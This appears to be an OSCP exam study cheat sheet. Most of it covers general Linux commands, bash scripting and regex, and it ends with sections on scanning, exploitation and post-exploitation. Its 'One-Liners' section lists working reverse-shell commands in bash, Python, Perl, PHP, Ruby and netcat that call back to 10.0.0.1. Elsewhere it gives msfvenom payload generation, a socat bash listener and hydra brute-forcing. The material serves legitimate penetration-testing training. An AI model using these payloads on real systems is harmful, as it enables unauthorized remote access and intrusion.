# Command Line Cheat Sheet for OSCP

## Navigation Commands

| Command | Description | Example |
|---------|-------------|---------|
| `pwd` | Print working directory | `pwd` |
| `ls` | List directory contents | `ls -la` |
| `cd` | Change directory | `cd /etc` |
| `find` | Search for files | `find / -name "*.txt" 2>/dev/null` |
| `locate` | Find files by name | `locate password` |
| `which` | Show full path of commands | `which python` |
| `whereis` | Locate binary, source, and manual | `whereis bash` |

## File Operations

| Command | Description | Example |
|---------|-------------|---------|
| `cat` | Display file contents | `cat /etc/passwd` |
| `less` | View file with pagination | `less /var/log/syslog` |
| `head` | Display first lines of file | `head -n 10 file.txt` |
| `tail` | Display last lines of file | `tail -f /var/log/apache2/access.log` |
| `touch` | Create empty file | `touch newfile.txt` |
| `mkdir` | Create directory | `mkdir -p dir1/dir2` |
| `cp` | Copy files or directories | `cp -r source/ destination/` |
| `mv` | Move/rename files or directories | `mv oldname.txt newname.txt` |
| `rm` | Remove files or directories | `rm -rf directory/` |
| `chmod` | Change file permissions | `chmod 755 script.sh` |
| `chown` | Change file owner | `chown user:group file.txt` |
| `ln` | Create links | `ln -s target link_name` |

## Text Processing

| Command | Description | Example |
|---------|-------------|---------|
| `grep` | Search text patterns | `grep -i "password" /etc/*.conf` |
| `sed` | Stream editor for text manipulation | `sed 's/old/new/g' file.txt` |
| `awk` | Pattern scanning and processing | `awk '{print $1,$5}' file.txt` |
| `cut` | Extract sections from lines | `cut -d: -f1 /etc/passwd` |
| `sort` | Sort lines of text | `sort -n numbers.txt` |
| `uniq` | Report or filter repeated lines | `sort file.txt \| uniq -c` |
| `wc` | Count lines, words, and characters | `wc -l file.txt` |
| `tr` | Translate characters | `cat file.txt \| tr 'a-z' 'A-Z'` |
| `diff` | Compare files line by line | `diff file1.txt file2.txt` |
| `tee` | Read from stdin and write to stdout/files | `echo "test" \| tee file.txt` |

## Command Chaining

| Operator | Description | Example |
|----------|-------------|---------|
| `\|` | Pipe output to another command | `cat file.txt \| grep "error"` |
| `>` | Redirect output to a file (overwrite) | `echo "text" > file.txt` |
| `>>` | Redirect output to a file (append) | `echo "more text" >> file.txt` |
| `<` | Input from a file | `sort < unsorted.txt` |
| `&&` | Execute next command if previous succeeds | `mkdir dir && cd dir` |
| `\|\|` | Execute next command if previous fails | `ping -c 1 host \|\| echo "host down"` |
| `;` | Execute commands sequentially | `echo "first"; echo "second"` |
| `$(...)` | Command substitution | `echo "Today is $(date)"` |
| `&` | Run command in background | `long_command &` |

## Process Management

| Command | Description | Example |
|---------|-------------|---------|
| `ps` | Display running processes | `ps aux` |
| `top` | Dynamic process viewer | `top` |
| `htop` | Enhanced interactive process viewer | `htop` |
| `kill` | Terminate processes | `kill -9 1234` |
| `pkill` | Kill processes by name | `pkill firefox` |
| `killall` | Kill processes by name | `killall -9 httpd` |
| `bg` | Send processes to background | `bg %1` |
| `fg` | Bring processes to foreground | `fg %1` |
| `jobs` | List background jobs | `jobs` |
| `nohup` | Run command immune to hangups | `nohup command &` |
| `nice` | Run with modified scheduling priority | `nice -n 19 command` |
| `renice` | Alter priority of running processes | `renice -n 19 -p 1234` |

## Network Commands

| Command | Description | Example |
|---------|-------------|---------|
| `ifconfig` | Configure network interfaces | `ifconfig eth0` |
| `ip` | Show/manipulate routing, devices, etc. | `ip addr show` |
| `netstat` | Network statistics | `netstat -tuln` |
| `ss` | Socket statistics | `ss -tuln` |
| `ping` | Test network connectivity | `ping -c 4 google.com` |
| `traceroute` | Trace packet route | `traceroute google.com` |
| `dig` | DNS lookup | `dig example.com` |
| `host` | DNS lookup | `host example.com` |
| `nslookup` | DNS lookup | `nslookup example.com` |
| `whois` | Domain registration info | `whois example.com` |
| `curl` | Transfer data from/to servers | `curl -O http://example.com/file` |
| `wget` | Download files from web | `wget http://example.com/file` |
| `nc` | Netcat - networking utility | `nc -lvnp 4444` |

## File Transfer

| Command | Description | Example |
|---------|-------------|---------|
| `scp` | Secure copy | `scp file.txt user@host:/path` |
| `rsync` | Remote file sync | `rsync -avz source/ user@host:/dest/` |
| `sftp` | Secure FTP | `sftp user@host` |
| `ftp` | File Transfer Protocol | `ftp ftp.example.com` |
| `python -m http.server` | Simple HTTP server | `python -m http.server 8000` |
| `python -m SimpleHTTPServer` | Python 2 HTTP server | `python -m SimpleHTTPServer 8000` |

## Compression and Archiving

| Command | Description | Example |
|---------|-------------|---------|
| `tar` | Tape archive | `tar -czvf archive.tar.gz directory/` |
| `gzip` | Compress files | `gzip file.txt` |
| `gunzip` | Decompress gzip files | `gunzip file.txt.gz` |
| `zip` | Package and compress files | `zip -r archive.zip directory/` |
| `unzip` | Extract zip archives | `unzip archive.zip` |
| `7z` | 7-Zip compression | `7z a archive.7z directory/` |

## System Information

| Command | Description | Example |
|---------|-------------|---------|
| `uname` | Print system information | `uname -a` |
| `hostname` | Show or set system hostname | `hostname` |
| `uptime` | System running time and load | `uptime` |
| `free` | Display memory usage | `free -h` |
| `df` | Disk space usage | `df -h` |
| `du` | Directory space usage | `du -sh /var` |
| `lsblk` | List block devices | `lsblk` |
| `lsusb` | List USB devices | `lsusb` |
| `lspci` | List PCI devices | `lspci` |
| `dmidecode` | DMI table decoder | `sudo dmidecode` |

## User Management

| Command | Description | Example |
|---------|-------------|---------|
| `whoami` | Print current user | `whoami` |
| `id` | Print user and group info | `id` |
| `who` | Show who is logged in | `who` |
| `w` | Show who is logged in and what they're doing | `w` |
| `last` | Show last logins | `last` |
| `useradd` | Create a new user | `useradd -m username` |
| `usermod` | Modify user account | `usermod -aG sudo username` |
| `userdel` | Delete a user | `userdel -r username` |
| `passwd` | Change password | `passwd username` |
| `su` | Switch user | `su - username` |
| `sudo` | Execute command as another user | `sudo command` |

## File Permissions

| Permission | Numeric | Description |
|------------|---------|-------------|
| `r` | 4 | Read permission |
| `w` | 2 | Write permission |
| `x` | 1 | Execute permission |
| `-` | 0 | No permission |

### Common Permission Combinations

| Numeric | Symbolic | Description |
|---------|----------|-------------|
| `777` | `rwxrwxrwx` | Full permissions for everyone |
| `755` | `rwxr-xr-x` | Executable by all, writable only by owner |
| `700` | `rwx------` | Accessible only by owner |
| `644` | `rw-r--r--` | Readable by all, writable only by owner |
| `600` | `rw-------` | Readable/writable only by owner |
| `444` | `r--r--r--` | Readable by all, writable by none |

## Special Operators

| Operator | Description | Example |
|----------|-------------|---------|
| `*` | Wildcard for any characters | `ls *.txt` |
| `?` | Wildcard for single character | `ls file?.txt` |
| `[]` | Character class | `ls [abc]*.txt` |
| `{}` | Brace expansion | `touch file{1,2,3}.txt` |
| `~` | Home directory | `cd ~` |
| `!` | Command history expansion | `!ssh` |
| `!!` | Repeat last command | `sudo !!` |
| `$?` | Exit status of last command | `echo $?` |
| `$0` | Current shell or script name | `echo $0` |
| `$1-$9` | Positional parameters | `echo $1` |
| `$#` | Number of positional parameters | `echo $#` |
| `$@` | All positional parameters | `echo $@` |
| `$*` | All positional parameters as single word | `echo $*` |
| `$$` | Process ID of current shell | `echo $$` |

## OSCP-Relevant Commands

### Information Gathering

| Command | Description | Example |
|---------|-------------|---------|
| `nmap` | Network exploration and security scanning | `nmap -sS -sV -p- 192.168.1.1` |
| `nikto` | Web server scanner | `nikto -h http://target.com` |
| `dirb` | Web content scanner | `dirb http://target.com` |
| `gobuster` | Directory/file brute forcing | `gobuster dir -u http://target.com -w wordlist.txt` |
| `enum4linux` | Enumerate Windows/Samba systems | `enum4linux -a 192.168.1.1` |
| `smbclient` | SMB client | `smbclient -L //192.168.1.1` |
| `showmount` | Show mount information for NFS server | `showmount -e 192.168.1.1` |

### Exploitation

| Command | Description | Example |
|---------|-------------|---------|
| `searchsploit` | Search exploit-db | `searchsploit apache 2.4.7` |
| `msfconsole` | Metasploit Framework | `msfconsole` |
| `msfvenom` | Payload generator | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe` |
| `hydra` | Password cracking | `hydra -l admin -P passwords.txt ssh://192.168.1.1` |
| `john` | Password cracking | `john --wordlist=wordlist.txt hashes.txt` |
| `hashcat` | Password cracking | `hashcat -m 0 -a 0 hashes.txt wordlist.txt` |

### Post-Exploitation

| Command | Description | Example |
|---------|-------------|---------|
| `netcat` | Networking utility | `nc -lvnp 4444` |
| `socat` | Multipurpose relay | `socat TCP4-LISTEN:4444,fork EXEC:/bin/bash` |
| `python -c 'import pty;pty.spawn("/bin/bash")'` | Spawn TTY shell | `python -c 'import pty;pty.spawn("/bin/bash")'` |
| `find / -perm -u=s -type f 2>/dev/null` | Find SUID binaries | `find / -perm -u=s -type f 2>/dev/null` |
| `find / -writable -type d 2>/dev/null` | Find writable directories | `find / -writable -type d 2>/dev/null` |
| `uname -a` | Kernel information | `uname -a` |
| `cat /etc/issue` | OS information | `cat /etc/issue` |
| `cat /etc/*-release` | OS version | `cat /etc/*-release` |

## One-Liners for OSCP

### Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Netcat
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### File Transfers

```bash
# Start a simple HTTP server
python -m http.server 8000
python -m SimpleHTTPServer 8000  # Python 2

# Download files with wget
wget http://10.0.0.1:8000/file.txt

# Download files with curl
curl -O http://10.0.0.1:8000/file.txt

# Transfer with netcat (receiver)
nc -lvnp 4444 > file.txt

# Transfer with netcat (sender)
nc 10.0.0.1 4444 < file.txt

# Base64 encode/decode for transfer
cat binary_file | base64 > encoded.txt
cat encoded.txt | base64 -d > binary_file
```

### Privilege Escalation Checks

```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Find world-writable files
find / -perm -2 -type f 2>/dev/null

# Check for sudo permissions
sudo -l

# Check running processes
ps aux

# Check for cron jobs
ls -la /etc/cron*
cat /etc/crontab

# Check for unusual SUID files
find / -user root -perm -4000 -print 2>/dev/null

# Check for unusual SGID files
find / -group root -perm -2000 -print 2>/dev/null
```

## Bash Scripting Basics

### Variables

```bash
# Define variables
NAME="John"
AGE=30

# Use variables
echo "Name: $NAME, Age: $AGE"

# Command substitution
DATE=$(date)
echo "Current date: $DATE"

# Arithmetic operations
RESULT=$((10 + 5))
echo "10 + 5 = $RESULT"
```

### Conditionals

```bash
# If statement
if [ "$NAME" = "John" ]; then
    echo "Hello John!"
elif [ "$NAME" = "Jane" ]; then
    echo "Hello Jane!"
else
    echo "Hello stranger!"
fi

# File tests
if [ -f "/etc/passwd" ]; then
    echo "File exists"
fi

if [ -d "/etc" ]; then
    echo "Directory exists"
fi
```

### Loops

```bash
# For loop
for i in 1 2 3 4 5; do
    echo "Number: $i"
done

# While loop
COUNT=1
while [ $COUNT -le 5 ]; do
    echo "Count: $COUNT"
    COUNT=$((COUNT + 1))
done

# Until loop
COUNT=1
until [ $COUNT -gt 5 ]; do
    echo "Count: $COUNT"
    COUNT=$((COUNT + 1))
done
```

### Functions

```bash
# Define function
hello() {
    echo "Hello, $1!"
}

# Call function
hello "World"
```

## Regular Expressions

| Pattern | Description | Example |
|---------|-------------|---------|
| `.` | Any single character | `a.c` matches "abc", "adc", etc. |
| `^` | Start of line | `^hello` matches lines starting with "hello" |
| `$` | End of line | `world$` matches lines ending with "world" |
| `*` | Zero or more occurrences | `ab*c` matches "ac", "abc", "abbc", etc. |
| `+` | One or more occurrences | `ab+c` matches "abc", "abbc", but not "ac" |
| `?` | Zero or one occurrence | `ab?c` matches "ac" and "abc" |
| `[]` | Character class | `[abc]` matches "a", "b", or "c" |
| `[^]` | Negated character class | `[^abc]` matches any character except "a", "b", or "c" |
| `\d` | Digit | `\d+` matches one or more digits |
| `\w` | Word character | `\w+` matches one or more word characters |
| `\s` | Whitespace | `\s+` matches one or more whitespace characters |
| `{n}` | Exactly n occurrences | `a{3}` matches "aaa" |
| `{n,}` | At least n occurrences | `a{2,}` matches "aa", "aaa", etc. |
| `{n,m}` | Between n and m occurrences | `a{2,4}` matches "aa", "aaa", "aaaa" |
| `()` | Grouping | `(abc)+` matches "abc", "abcabc", etc. |
| `\|` | Alternation | `cat\|dog` matches "cat" or "dog" |

## OSCP Tips

1. **Document everything** - Use `script` command to record terminal sessions
2. **Always have multiple shells** - Never rely on a single connection
3. **Use simple tools first** - Start with basic commands before complex tools
4. **Check file permissions carefully** - Look for misconfigured permissions
5. **Look for unusual SUID/SGID binaries** - Common privilege escalation vector
6. **Check for world-writable files** - Potential for configuration tampering
7. **Examine cron jobs** - Look for tasks running as privileged users
8. **Verify network connections** - Use `netstat` or `ss` to find open ports
9. **Check running processes** - Look for unusual or vulnerable services
10. **Test input validation** - Look for command injection opportunities
